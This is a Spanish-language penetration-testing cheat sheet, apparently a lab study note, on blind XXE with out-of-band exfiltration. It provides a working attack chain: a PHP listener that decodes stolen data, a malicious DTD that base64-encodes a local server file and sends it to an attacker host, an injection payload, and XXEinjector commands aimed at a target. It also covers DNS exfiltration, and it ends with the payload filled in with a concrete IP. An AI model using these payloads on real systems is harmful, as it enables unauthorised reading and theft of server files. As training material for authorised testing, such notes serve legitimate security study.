---
tags:
  - webapp
  - XXE
  - attack
---
## Conceptos Clave (TL;DR)
* La vulnerabilidad Blind XXE ocurre cuando la aplicación no devuelve el output de nuestras entidades XML ni muestra errores de ejecución en la respuesta.
* Para extraer los datos se utiliza la exfiltración Out-of-band (OOB), forzando a la aplicación objetivo a enviar el contenido del archivo directamente a un servidor controlado por el atacante.
* El contenido de los archivos a leer debe ser codificado en base64 mediante `php://filter` para evitar romper la sintaxis de la URL en la petición HTTP de salida.

## Herramientas Clave
* **Servidor PHP (`php -S`)**: Utilizado para alojar el DTD malicioso y recibir las peticiones OOB con los datos extraídos.
* **XXEinjector**: Herramienta en Ruby que automatiza ataques XXE, incluyendo la exfiltración OOB ciega, leyendo un archivo de petición HTTP modificado.
* **tcpdump**: Necesario para interceptar peticiones entrantes cuando se utiliza exfiltración OOB a través de DNS.

## Metodología Paso a Paso
**Fase 1: Preparación de la infraestructura del atacante**
Debemos preparar nuestro entorno para recibir e interpretar la petición que forzaremos a realizar al servidor objetivo. Se crea un script PHP que toma el parámetro URL recibido, lo decodifica de base64 y lo imprime, levantando un servidor web local.

**Fase 2: Construcción y alojamiento del Payload OOB (Manual)**
Se requiere alojar un archivo `.dtd` en nuestro servidor. Este archivo definirá una entidad que lee el archivo objetivo en base64 y otra entidad que hace la petición a nuestra IP inyectando el resultado en la URL.

**Fase 3: Inyección en la aplicación**
Enviamos una petición XML a la aplicación vulnerable llamando a nuestro archivo DTD alojado. La aplicación lee las instrucciones, procesa el archivo local y nos envía los datos decodificados en el log de nuestro servidor PHP.

**Fase 4: Exfiltración automatizada (Alternativa)**
En lugar del método manual, se intercepta la petición HTTP legítima, se coloca un marcador (`XXEINJECT`) indicando el punto de inyección, y se automatiza la codificación/decodificación y extracción de múltiples archivos usando XXEinjector.

## Cheat Sheet de Comandos

#### Exfiltración OOB Manual
```bash
# Crea un script PHP en el directorio de trabajo (index.php) que intercepta el parametro 'content', lo decodifica y lo muestra en pantalla.
cat <<EOF > index.php
<?php
if(isset(\$_GET['content'])){
    error_log("\n\n" . base64_decode(\$_GET['content']));
}
?>
EOF

# Levanta un servidor web de desarrollo de PHP en el puerto especificado para escuchar peticiones entrantes.
php -S 0.0.0.0:<ATTACKER_PORT>
```

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<FILE_PATH_TO_READ>">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<ATTACKER_IP>:<ATTACKER_PORT>/?content=%file;'>">
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
<!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:<ATTACKER_PORT>/xxe.dtd">
%remote;
%oob;
]>
<root>&content;</root>
```

#### Exfiltración OOB Automatizada (XXEinjector)
```bash
# Clona el repositorio de la herramienta automatizada.
git clone https://github.com/enjoiz/XXEinjector.git
```

```http
# Archivo de petición HTTP (ej. xxe.req) preparado para XXEinjector. 
# CRITICO: Solo incluye la declaración XML seguida de XXEINJECT.
POST /<TARGET_ENDPOINT> HTTP/1.1
Host: <TARGET_IP>
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

```bash
# Ejecuta XXEinjector utilizando la petición interceptada, configurando los callbacks HTTP y forzando el uso de base64 (phpfilter) para evitar romper el payload.
ruby XXEinjector.rb --host=<ATTACKER_IP> --httpport=<ATTACKER_PORT> --file=<PATH_TO_REQ_FILE> --path=<FILE_PATH_TO_READ> --oob=http --phpfilter

# Muestra el contenido del archivo exfiltrado que la herramienta guardó automáticamente en disco.
cat Logs/<TARGET_IP>/<FILE_PATH_TO_READ>.log
```

## "Gotchas" y Troubleshooting
* **Silencio de XXEinjector:** La herramienta automatizada no imprimirá directamente los datos extraídos en la terminal porque se está utilizando codificación base64; todos los resultados decodificados se almacenan en la carpeta `Logs/<TARGET_IP>/` dentro del directorio de la herramienta.
* **Formato del archivo para XXEinjector:** El archivo de petición base guardado desde Burp Suite NO debe incluir los datos completos del payload XML. Debes borrar la estructura XML original y dejar exclusivamente la primera línea de declaración XML, seguida inmediatamente por el marcador `XXEINJECT`.
* **OOB por DNS:** Si el objetivo bloquea conexiones HTTP salientes a puertos no estándar o IPs externas, considera usar Exfiltración OOB por DNS. Esto inserta los datos en base64 como un subdominio (`ENCODEDTEXT.<ATTACKER_DOMAIN>`) que puedes interceptar en tu servidor utilizando herramientas como `tcpdump`.
* **Complejidad de DNS:** La exfiltración mediante DNS se considera una técnica más avanzada y requiere mayor configuración e infraestructura de parte del atacante.



<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
<!ENTITY % remote SYSTEM "http://10.10.15.104:8000/xxe.dtd">
%remote;
%oob;
]>